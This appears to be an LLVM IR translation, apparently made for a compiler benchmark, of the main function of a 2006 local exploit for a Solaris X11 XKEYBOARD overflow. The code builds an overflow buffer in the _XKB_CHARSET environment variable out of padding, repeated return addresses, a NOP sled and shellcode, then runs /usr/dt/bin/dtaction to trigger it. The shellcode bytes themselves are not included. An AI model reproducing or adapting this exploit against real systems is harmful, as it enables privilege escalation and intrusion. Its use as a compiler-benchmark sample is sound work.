; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_2331.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_2331.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [63 x i8] c"X11R6 XKEYBOARD extension Strcmp() for Sun Solaris 8 9 10 x86\0A\00", align 1
@.str.1 = private unnamed_addr constant [58 x i8] c"Copyright 2006 RISE Security <contact@risesecurity.org>\0A\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [27 x i8] c"usage: %s xserver:display\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [11 x i8] c"DISPLAY=%s\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"_XKB_CHARSET=\00", align 1
@ADRSIZE = common dso_local global i32 0, align 4
@NOPSIZE = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32* null, align 8
@.str.5 = private unnamed_addr constant [21 x i8] c"/usr/dt/bin/dtaction\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"dtaction\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [8192 x i8], align 16
  %7 = alloca [256 x i8], align 16
  %8 = alloca [4 x i8], align 1
  %9 = alloca [4 x i8*], align 16
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = call i32 @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str, i64 0, i64 0))
  %13 = call i32 @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.1, i64 0, i64 0))
  %14 = load i32, i32* %4, align 4
  %15 = icmp ne i32 %14, 2
  br i1 %15, label %16, label %24

16:                                               ; preds = %2
  %17 = load i32, i32* @stderr, align 4
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 @fprintf(i32 %17, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.2, i64 0, i64 0), i8* %20)
  %22 = load i32, i32* @EXIT_FAILURE, align 4
  %23 = call i32 @exit(i32 %22) #3
  unreachable

24:                                               ; preds = %2
  %25 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 0
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 1
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 @snprintf(i8* %25, i32 256, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0), i8* %28)
  %30 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %31 = ptrtoint i8* %30 to i32
  %32 = add i32 %31, 256
  %33 = add i32 %32, 1024
  %34 = add i32 %33, 2048
  %35 = add i32 %34, 1
  %36 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 0
  %37 = bitcast i8* %36 to i32*
  store i32 %35, i32* %37, align 1
  %38 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  store i8* %38, i8** %10, align 8
  %39 = load i8*, i8** %10, align 8
  %40 = call i32 @sprintf(i8* %39, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0))
  %41 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %42 = getelementptr inbounds i8, i8* %41, i64 13
  store i8* %42, i8** %10, align 8
  store i32 0, i32* %11, align 4
  br label %43

43:                                               ; preds = %49, %24
  %44 = load i32, i32* %11, align 4
  %45 = icmp slt i32 %44, 256
  br i1 %45, label %46, label %52

46:                                               ; preds = %43
  %47 = load i8*, i8** %10, align 8
  %48 = getelementptr inbounds i8, i8* %47, i32 1
  store i8* %48, i8** %10, align 8
  store i8 65, i8* %47, align 1
  br label %49

49:                                               ; preds = %46
  %50 = load i32, i32* %11, align 4
  %51 = add nsw i32 %50, 1
  store i32 %51, i32* %11, align 4
  br label %43

52:                                               ; preds = %43
  store i32 0, i32* %11, align 4
  br label %53

53:                                               ; preds = %65, %52
  %54 = load i32, i32* %11, align 4
  %55 = load i32, i32* @ADRSIZE, align 4
  %56 = icmp slt i32 %54, %55
  br i1 %56, label %57, label %68

57:                                               ; preds = %53
  %58 = load i32, i32* %11, align 4
  %59 = srem i32 %58, 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 %60
  %62 = load i8, i8* %61, align 1
  %63 = load i8*, i8** %10, align 8
  %64 = getelementptr inbounds i8, i8* %63, i32 1
  store i8* %64, i8** %10, align 8
  store i8 %62, i8* %63, align 1
  br label %65

65:                                               ; preds = %57
  %66 = load i32, i32* %11, align 4
  %67 = add nsw i32 %66, 1
  store i32 %67, i32* %11, align 4
  br label %53

68:                                               ; preds = %53
  store i32 0, i32* %11, align 4
  br label %69

69:                                               ; preds = %76, %68
  %70 = load i32, i32* %11, align 4
  %71 = load i32, i32* @NOPSIZE, align 4
  %72 = icmp slt i32 %70, %71
  br i1 %72, label %73, label %79

73:                                               ; preds = %69
  %74 = load i8*, i8** %10, align 8
  %75 = getelementptr inbounds i8, i8* %74, i32 1
  store i8* %75, i8** %10, align 8
  store i8 -112, i8* %74, align 1
  br label %76

76:                                               ; preds = %73
  %77 = load i32, i32* %11, align 4
  %78 = add nsw i32 %77, 1
  store i32 %78, i32* %11, align 4
  br label %69

79:                                               ; preds = %69
  store i32 0, i32* %11, align 4
  br label %80

80:                                               ; preds = %94, %79
  %81 = load i32, i32* %11, align 4
  %82 = load i32*, i32** @shellcode, align 8
  %83 = call i32 @strlen(i32* %82)
  %84 = icmp slt i32 %81, %83
  br i1 %84, label %85, label %97

85:                                               ; preds = %80
  %86 = load i32*, i32** @shellcode, align 8
  %87 = load i32, i32* %11, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i32, i32* %86, i64 %88
  %90 = load i32, i32* %89, align 4
  %91 = trunc i32 %90 to i8
  %92 = load i8*, i8** %10, align 8
  %93 = getelementptr inbounds i8, i8* %92, i32 1
  store i8* %93, i8** %10, align 8
  store i8 %91, i8* %92, align 1
  br label %94

94:                                               ; preds = %85
  %95 = load i32, i32* %11, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %11, align 4
  br label %80

97:                                               ; preds = %80
  %98 = load i8*, i8** %10, align 8
  store i8 0, i8* %98, align 1
  %99 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %100 = getelementptr inbounds [4 x i8*], [4 x i8*]* %9, i64 0, i64 0
  store i8* %99, i8** %100, align 16
  %101 = getelementptr inbounds [256 x i8], [256 x i8]* %7, i64 0, i64 0
  %102 = getelementptr inbounds [4 x i8*], [4 x i8*]* %9, i64 0, i64 1
  store i8* %101, i8** %102, align 8
  %103 = getelementptr inbounds [4 x i8*], [4 x i8*]* %9, i64 0, i64 2
  store i8* null, i8** %103, align 16
  %104 = getelementptr inbounds [4 x i8*], [4 x i8*]* %9, i64 0, i64 0
  %105 = call i32 @execle(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0), i32 0, i8** %104)
  %106 = load i32, i32* @EXIT_FAILURE, align 4
  %107 = call i32 @exit(i32 %106) #3
  unreachable
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @fprintf(i32, i8*, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*) #1

declare dso_local i32 @sprintf(i8*, i8*) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @execle(i8*, i8*, i32, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
